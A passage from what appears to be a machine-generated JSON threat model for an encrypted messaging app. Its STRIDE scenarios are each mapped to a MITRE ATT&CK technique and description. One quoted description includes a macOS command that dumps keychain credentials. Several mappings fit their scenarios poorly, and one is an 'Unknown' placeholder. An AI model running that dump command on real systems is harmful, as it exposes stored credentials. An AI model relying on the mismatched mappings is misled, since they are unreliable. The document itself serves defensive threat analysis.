                "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292",
                "technique_id": "T1565.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious actor within the organization manipulates logs to cover tracks of fraudulent activities.",
            "Assumptions": [
                {
                    "Assumption": "An insider has access to logging systems.",
                    "Role": "Insider",
                    "Condition": "Insufficient access restrictions for logging systems."
                },
                {
                    "Assumption": "There are no mechanisms to detect log modifications.",
                    "Role": "Application",
                    "Condition": "Lack of surveillance or tamper-evident logging."
                },
                {
                    "Assumption": "Logging does not leverage cryptographic assurance.",
                    "Role": "Application",
                    "Condition": "Logging systems do not implement cryptographic integrity checks."
                }
            ],
            "Potential Impact": "Undetected fraudulent activities, compromised audit trails.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "insider threat",
                "log tampering",
                "fraud",
                "integrity"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits flaws in encryption protocols to decrypt intercepted messages.",
            "Assumptions": [
                {
                    "Assumption": "Encryption protocols have vulnerabilities.",
                    "Role": "Application",
                    "Condition": "Usage of flawed or outdated encryption protocols."
                },
                {
                    "Assumption": "The attacker has the ability to intercept transmissions.",
                    "Role": "Attacker",
                    "Condition": "Man-in-the-middle capability or network access."
                },
                {
                    "Assumption": "No application-level countermeasures are in place.",
                    "Role": "Application",
                    "Condition": "Absence of additional cryptographic controls."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive communications.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "encryption",
                "vulnerability exploitation",
                "interception",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Insecure storage settings expose encrypted SQLite databases containing sensitive message data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker gains access to stored databases.",
                    "Role": "Attacker",
                    "Condition": "Compromise of the storage medium or device."
                },
                {
                    "Assumption": "Weak encryption implementation on stored databases.",
                    "Role": "Application",
                    "Condition": "Usage of flawed or insufficient encryption for storage."
                },
                {
                    "Assumption": "No file-level access controls are applied.",
                    "Role": "Application",
                    "Condition": "Lack of access control mechanisms for sensitive files."
                }
            ],
            "Potential Impact": "Unauthorized access and disclosure of stored message data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "insecure storage",
                "database",
                "encrypted data",
                "device"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Compromised companion devices leak identity keys and decrypt past communications.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has compromised the companion device.",
                    "Role": "Attacker",
                    "Condition": "Physical or remote access to the companion device."
                },
                {
                    "Assumption": "Identity keys are stored or accessible on the device.",
                    "Role": "Application",
                    "Condition": "Presence or accessibility of sensitive keys."
                },
                {
                    "Assumption": "Previous communications remain encrypted and stored.",
                    "Role": "Application",
                    "Condition": "Historical message data stored in accessible form."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of historical communications and sensitive keys.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "compromised device",
                "keys",
                "past communications",
                "decryption"
            ],
            "mitre_technique": {
                "name": "Keychain",
                "description": "Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple\u2019s iCloud service. \n\nKeychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.(Citation: Keychain Services Apple)(Citation: Keychain Decryption Passware)(Citation: OSX Keychain Schaumann)\n\nAdversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain \u2013d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user\u2019s password to login to the macOS host.(Citation: External to DA, the OS X Way)(Citation: Empire Keychain Decrypt)  ",
                "id": "attack-pattern--1eaebf46-e361-4437-bc23-d5d65a3b92e3",
                "technique_id": "T1555.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A distributed denial-of-service (DDoS) attack targets the messaging application servers.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can marshal sufficient resources for a DDoS attack.",
                    "Role": "Attacker",
                    "Condition": "Control or influence over multiple systems for a DDoS."
                },
                {
                    "Assumption": "Application servers are vulnerable to traffic overload.",
                    "Role": "Application",
                    "Condition": "Lack of adequate DDoS protection and mitigation."
                },
                {
                    "Assumption": "There are no redundant systems or failover mechanisms.",
                    "Role": "Application",
                    "Condition": "Absence of failover mechanisms or load balancing."
                }
            ],
            "Potential Impact": "Disruption of service availability for legitimate users.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "traffic overload",
                "application servers",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker sends malformed or malicious messages to exploit protocol flaws, crashing the application.",
            "Assumptions": [
                {
                    "Assumption": "The attacker identifies and exploits protocol vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of protocol weaknesses and flaw exploitation."
                },
                {
                    "Assumption": "Application lacks input validation for messages.",
                    "Role": "Application",
                    "Condition": "No strong input validation mechanisms for messages."
                },
                {
                    "Assumption": "Mechanisms to handle unexpected inputs are inadequate.",
                    "Role": "Application",
                    "Condition": "Lack of robust error handling mechanisms."
                }
            ],
            "Potential Impact": "Application crashes, causing service disruption.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "protocol exploitation",
                "malformed messages",
                "crash",
                "application"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Resource exhaustion attack where multiple clients repeatedly request identity verification, overwhelming the system.",
            "Assumptions": [
                {
                    "Assumption": "Identity verification requests are not rate-limited.",
                    "Role": "Application",
                    "Condition": "Absence of rate-limiting mechanisms for verification."
                },
                {
                    "Assumption": "Attackers can generate excessive verification requests.",
                    "Role": "Attacker",
                    "Condition": "Ability to automate and send numerous requests."
                },
                {
                    "Assumption": "System does not have resource management protections.",
                    "Role": "Application",
                    "Condition": "Lack of protections against resource exhaustion."
                }
            ],
            "Potential Impact": "Resource exhaustion, leading to service disruption.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "identity verification",
                "system overload"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the desktop client software to gain elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities exist in the desktop client's code.",
                    "Role": "Application",
                    "Condition": "Presence of exploitable software vulnerabilities."
                },
                {
                    "Assumption": "The attacker can execute arbitrary code via this exploit.",
                    "Role": "Attacker",
                    "Condition": "Capability to leverage the vulnerability for code execution."
                },
                {
                    "Assumption": "The operating system or application fails to contain the exploit.",
                    "Role": "Application/OS",
                    "Condition": "Lack of sandboxing or exploit containment strategies."
                }
            ],
            "Potential Impact": "Unauthorized actions with elevated privileges, potentially full system compromise.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploitation",
                "desktop client",
                "arbitrary code execution"
            ],
            "mitre_technique": {
                "name": "Exploitation for Client Execution",
                "description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
                "id": "attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63",
                "technique_id": "T1203"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user escalates privileges by manipulating authorization tokens on a compromised device.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the compromised device.",
                    "Role": "Attacker",
                    "Condition": "Compromise or physical access to the device."
                },
                {
                    "Assumption": "Authorization tokens are inadequately protected.",
                    "Role": "Application",
                    "Condition": "Weak or absent protection for authorization tokens."
                },
                {
                    "Assumption": "No strong mechanisms to detect token manipulation.",
                    "Role": "Application",
                    "Condition": "Lack of detection mechanisms for unauthorized token changes."
                }
            ],
            "Potential Impact": "Unauthorized access and actions within the application, potential data compromise.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "authorization tokens",
                "compromised device",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the encryption protocol used on the primary device to obtain admin-level access.",
            "Assumptions": [
                {
                    "Assumption": "The encryption protocol used by the primary device has vulnerabilities.",
                    "Role": "Application",
                    "Condition": "Usage of flawed or outdated encryption protocols."
                },
                {
                    "Assumption": "The attacker has the capability to exploit these weaknesses.",
                    "Role": "Attacker",
                    "Condition": "Knowledge and resources to perform protocol exploitation."
                },
                {
                    "Assumption": "The system does not have additional layers of security to mitigate protocol exploitation.",
                    "Role": "Application",
                    "Condition": "Absence of multi-layered security measures."
                }
            ],
            "Potential Impact": "Full system compromise with elevated privileges, exposure of all communications.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "encryption protocol",
                "vulnerability exploitation",
                "primary device"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "11",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake instance of the messaging application to trick users into providing their credentials and identity keys.",
            "Assumptions": [
                {
                    "Assumption": "Users can be duped by a convincing fake application.",
                    "Role": "User",
                    "Condition": "User lacks vigilance in verifying application authenticity."
                },
                {
                    "Assumption": "The fake application can bypass initial security checks.",
                    "Role": "Attacker",
                    "Condition": "Attacker has resources to create a convincing fake."
                },
                {
                    "Assumption": "Installation from third-party sources is enabled on the device.",
                    "Role": "User",
                    "Condition": "User has allowed installations from unknown sources."
                }
            ],
            "Potential Impact": "Unauthorized system access, credential theft, and identity spoofing.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential theft",
                "device",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts messages by posing as a legitimate user or service provider.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has access to the network layer.",
                    "Role": "Attacker",
                    "Condition": "Attacker is within network range."
                },
                {
                    "Assumption": "Legitimate user skips verification of cryptographic keys.",
                    "Role": "User",
                    "Condition": "User fails to verify key fingerprint."
                },
                {
                    "Assumption": "User trusts unverified contacts.",
                    "Role": "User",
                    "Condition": "User accepts communications without verification."
                }
            ],
            "Potential Impact": "Compromised message confidentiality and integrity.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "man-in-the-middle",
                "network",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An adversary uses email or social engineering to gain access to users' authentication credentials and keys by impersonating the service provider.",
            "Assumptions": [
                {
                    "Assumption": "Users can be fooled by a legitimate-looking email or website.",
                    "Role": "User",
                    "Condition": "User does not verify the sender's authenticity."
                },
                {
                    "Assumption": "Attacker's email successfully bypasses spam filters.",
                    "Role": "Attacker",
                    "Condition": "Attackers can craft sophisticated phishing emails."
                },
                {
                    "Assumption": "User is likely to follow instructions from trusted sources blindly.",
                    "Role": "User",
                    "Condition": "User has high trust in service provider communications."
                }
            ],
            "Potential Impact": "Credential theft and unauthorized service access.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "credential theft",
                "social engineering",
                "email"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An adversary gains physical access to a compromised companion device and alters the stored authentication credentials.",
            "Assumptions": [
                {
                    "Assumption": "Physical security of companion devices is not robust.",
                    "Role": "User",
                    "Condition": "User leaves device unattended or unsecured."
                },
                {
                    "Assumption": "Stored credentials are not sufficiently encrypted.",
                    "Role": "Application Developer",
                    "Condition": "Encryption of stored data is weak or flawed."
                },
                {
                    "Assumption": "Companion device can access the primary device's data.",
                    "Role": "Companion Device",
                    "Condition": "The device is linked and authorized."
                }
            ],
            "Potential Impact": "Compromised data integrity and unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "device access",
                "data corruption",
                "credential theft"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits a vulnerability in the encryption protocol implementation to manipulate encrypted messages.",
            "Assumptions": [
                {
                    "Assumption": "There is a known or unknown protocol vulnerability.",
                    "Role": "Application Developer",
                    "Condition": "Protocol implementation is flawed."
                },
                {
                    "Assumption": "Attacker has access to network traffic.",
                    "Role": "Attacker",
                    "Condition": "Attacker can intercept and modify communications."
                },
                {
                    "Assumption": "User relies solely on the encryption mechanism for message integrity.",
                    "Role": "User",
                    "Condition": "User does not verify message content independently."
                }
            ],
            "Potential Impact": "Compromised message integrity and potential unauthorized actions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "encryption attack",
                "network",
                "message corruption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
